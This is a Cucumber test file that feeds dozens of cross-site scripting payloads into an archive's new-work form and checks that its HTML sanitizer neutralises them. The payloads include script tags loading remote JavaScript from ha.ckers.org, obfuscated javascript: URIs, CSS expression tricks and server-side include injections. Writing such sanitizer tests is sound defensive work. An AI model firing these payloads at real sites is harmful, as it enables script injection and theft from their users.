@works
Feature: Sanitizing HTML

  Scenario: XSS hacks in works should be blocked by sanitizing

  Given basic tags
    And I am logged in as "newbie" with password "password"
  When I go to the new work page
  Then I should see "Post New Work"
    And I select "Not Rated" from "Rating"
    And I check "No Archive Warnings Apply"
    And I fill in "Fandoms" with "Supernatural"
    And I fill in "Work Title" with "All Hell Breaks Loose"
    And I fill in "content" with `'';!--"<XSS>=&{()}`
  When I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
  When I press "Edit"
    And I fill in "content" with "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "xss"
    And I should not find "ha.ckers.org"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=JaVaScRiPt:alert('XSS')>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "CDATA"
    And I should see "<"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="jav	ascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="jav&#x09;ascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC=" &#14;  javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<<SCRIPT>alert("XSS");//<</SCRIPT>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "alert"
    And I should not find "SCRIPT"
  When I press "Edit"
    And I fill in "content" with "<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should find "strong"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<SCRIPT SRC=//ha.ckers.org/.j>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG SRC="javascript:alert('XSS')"`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<iframe src=http://ha.ckers.org/scriptlet.html <"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<SCRIPT>alert(/XSS/.source)</SCRIPT>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "CDATA"
    And I should see "alert(/XSS/.source)"
  When I press "Edit"
    And I fill in "content" with `\";alert('XSS');//`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "XSS"
    And I should find "XSS"
    # TODO: do we need a way to check this is just text and isn't actually making the alert?
  When I press "Edit"
    And I fill in "content" with '</TITLE><SCRIPT>alert("XSS");</SCRIPT>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<BODY BACKGROUND="javascript:alert('XSS')">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<BODY ONLOAD=alert('XSS')>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG DYNSRC="javascript:alert('XSS')">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<IMG LOWSRC="javascript:alert('XSS')">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<BGSOUND SRC="javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<BR SIZE="&{alert('XSS')}">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
    And I should not see "xss"
    And I should not find "STYLE>@import"
  When I press "Edit"
    And I fill in "content" with "@import'http://ha.ckers.org/xss.css';"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
    And I should see "xss"
    And I should not find "STYLE>@import"
  When I press "Edit"
    And I fill in "content" with '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with 'BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
    And I should see "BODY{-moz-binding:url("
  When I press "Edit"
    And I fill in "content" with '<XSS STYLE="behavior: url(xss.htc);">'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with "behavior: url(xss.htc);"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
    And I should see "behavior: url(xss.htc);"
  When I press "Edit"
    And I fill in "content" with `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `@im\port'\ja\vasc\ript:alert("XSS")';`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "XSS"
    And I should find "XSS"
    And I should not find "javascript" within "#main"
    And I should not find "import" within "#main"
  When I press "Edit"
    And I fill in "content" with "xss:expr/*blah*/ession(alert('XSS'))"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "XSS"
    And I should find "XSS"
    And I should not find "expression"
    And I should see "blah"
  When I press "Edit"
    And I fill in "content" with "xss:expression(alert('XSS'))"
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "XSS"
    And I should find "XSS"
    # TODO: figure out how to test that this isn't actually running
  When I press "Edit"
    And I fill in "content" with `<span style=background-image:url("javascript:alert('XSS')");>Text</span>`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with '<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>Blah</xss:xss></HTML>'
    And I press "Preview"
  Then I should see "Preview Work"
    # TODO: we also need to make sure this one is actually working and not executing
    And I should not see "XSS"
    And I should not find "XSS"
    And I should find "Blah"
  When I press "Edit"
    And I fill in "content" with '<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>'
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should see "XSS"
    And I should find "XSS"
    And I should see "alert"
    And I should see "echo"
    # TODO: Again, how do we test that it hasn't executed?
  When I press "Edit"
    And I fill in "content" with `<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
  When I press "Edit"
    And I fill in "content" with `';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
    And I press "Preview"
  Then I should see "Preview Work"
    And I should not see "XSS"
    And I should not find "XSS"
    And I should see "88,83,83"
    
    # TODO: Ones with all types of quote marks
#    When I fill in "content" with "<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>"
